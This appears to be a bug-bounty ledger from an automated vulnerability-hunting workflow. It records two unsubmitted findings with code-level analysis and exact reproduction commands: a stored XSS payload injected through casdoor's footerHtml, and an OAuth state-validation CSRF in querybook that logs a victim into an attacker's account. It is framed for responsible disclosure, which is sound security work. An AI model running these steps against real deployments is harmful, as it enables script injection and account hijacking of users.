# Bounty Ledger

Weaponized findings from `janitor hunt` campaigns, cross-referenced against
program scope and severity tiers. Only findings with a concrete `repro_cmd`,
reproduction payload, or generated HTML harness are entered.

Threat Model Awareness law applied: client-side `fetch()`/XHR calls are NOT
server-side SSRF. This ledger is reserved strictly for submission-ready
findings with `Approval % >= 85`.

## Submission Status Annotation Schema (Sprint 139)

Every row in this ledger MUST be preceded by an HTML comment in the canonical
form below so `.agent_governance/rules/cvp_red_team.md` triage protocol has a
stable parser target. The same schema applies to `CANDIDATE_LEDGER.md` rows
that have been routed toward submission attempts.

```
<!-- submission_status: NOT_SUBMITTED -->
<!-- submission_status: SUBMITTED_YYYY-MM-DD -->
<!-- submission_status: ACCEPTED -->
<!-- submission_status: REJECTED_<one-word-reason> -->
<!-- submission_status: DUPLICATE -->
<!-- submission_status: PAID_<amount_USD> -->
```

A row without any `submission_status` comment is treated as `NOT_SUBMITTED`
by the triage engine and flagged as the highest-EV operator action.

| Date | Target Repo | Vulnerability Class | Severity | Expected Payout | Approval % | Exact Repro Command | Exploitation Strategy |
|------|-------------|---------------------|----------|-----------------|------------|---------------------|-----------------------|
<!-- submission_status: NOT_SUBMITTED -->
| 2026-05-28 | https://github.com/casdoor/casdoor | security:react_xss_dangerous_html — `web/src/App.js:510` (`dangerouslySetInnerHTML={{__html: footerHtml}}`) — `object/application.go:UpdateApplication` accepts org-admin callers (guard at line 402 blocks only cross-org edits: `!isGlobalAdmin && oldApplication.Organization != application.Organization`); `routers/theme_filter.go:129` sets cookie `organizationFootHtml` server-side from stored value; `App.js:510` renders stored XSS payload to ALL authenticated users of the org. CWE-79 Stored XSS via admin-injectable footerHtml (schema_taint:proven, stored:cross_user_render, write-path confirmed at HEAD) | P2/High | $200–$500 | 85% | `# Step 1: Authenticate as org-admin and write XSS payload to footerHtml:` `curl -X POST https://<casdoor-host>/api/update-application -H "Authorization: Bearer <org-admin-token>" -H "Content-Type: application/json" -d '{"name":"<app-name>","owner":"<org>","footerHtml":"<img src=x onerror=alert(document.domain)>"}' -w "%{http_code}"` `# Expected: {"status":"ok","msg":"","data":true} 200` `# Step 2: Open https://<casdoor-host>/ in ANY second browser session (regular user, incognito window)` `# Expected: alert(document.domain) executes — stored XSS confirmed via organizationFootHtml cookie-set → dangerouslySetInnerHTML render` | Write-path confirmed at HEAD 2026-05-28: `controllers/application.go:240` calls `object.UpdateApplication(id, &application, c.IsGlobalAdmin(), ...)` — `IsGlobalAdmin()` is false for org-admin users; `object/application.go:402` guard `if !isGlobalAdmin && oldApplication.Organization != application.Organization` only blocks cross-org edits, NOT footerHtml mutation within the org. No middleware gate on `POST /api/update-application` (router.go:117 is a plain `web.Router` with no auth filter). `routers/theme_filter.go:111` copies `application.FooterHtml` into `OrganizationThemeCookie.FooterHtml`, then line 129 sets cookie `organizationFootHtml`. `web/src/App.js:508–512` renders `<div dangerouslySetInnerHTML={{__html: footerHtml}} />` unconditionally for all users who share the org. Sprint 184 promoted from CANDIDATE 60%→BOUNTY 85%. Disclose to: admin@casdoor.org or GitHub Security Advisory. |
<!-- submission_status: NOT_SUBMITTED -->
| 2026-05-28 | https://github.com/pinterest/querybook | security:oauth_missing_state_validation — `querybook/server/app/auth/oauth_auth.py:65,80` — `oauth_session` is a `@property` that creates a fresh `OAuth2Session` per call; `login():65` discards state (`_`); `oauth_callback():80` reads `code` without any state comparison; `requests_oauthlib` auto-state-check never fires because the session instance with stored state is destroyed between requests. Same structural gap confirmed in `okta_auth.py:84-109`. CWE-352 OAuth CSRF Account Fusion (KevCritical, `reachability_proof`) | P3/High | $200–$1,000 | 85% | `# 1. Attacker completes their own OAuth login at the same provider, captures authorization code BEFORE it is exchanged (intercept via mitmproxy at the redirect step): ATTACKER_CODE="<code from OAuth provider>"; TARGET="https://querybook.example.com"; # 2. CSRF trigger — craft malicious page that causes victim browser to issue this GET while their Querybook session is active: # <img src="${TARGET}/oauth2callback?code=${ATTACKER_CODE}">; # 3. Reproduce via curl with victim session cookie: curl -s -b victim_session.txt "${TARGET}/oauth2callback?code=${ATTACKER_CODE}" -L -w "%{http_code}"; # Expected: 302 → PUBLIC_URL; victim session is now authenticated as attacker account` | Source-code proof: `oauth_session` is a `@property` (lines 34-40 of `oauth_auth.py`) — recreates `OAuth2Session` on every access, destroying any generated CSRF state. `login():65` assigns `oauth_url, _ = self._get_authn_url()` where `_` explicitly discards the state token returned by `authorization_url()`. `oauth_callback():74-97` reads `code = request.args.get("code")` and immediately calls `_fetch_access_token(code)` — zero state comparison. When `_fetch_access_token` calls `self.oauth_session.fetch_token()`, it instantiates yet a third `OAuth2Session` with `state=None`, so `requests_oauthlib`'s built-in state validator has nothing to compare against. Attacker obtains a valid `code` from their own OAuth flow, embeds the callback URL in a CSRF trigger page, victim browser replays it → Querybook exchanges attacker's code → logs victim's session into attacker's account. Pinterest Bugcrowd in-scope: https://bugcrowd.com/pinterest. Sprint 183 promoted from CANDIDATE 70%→BOUNTY 85%. |
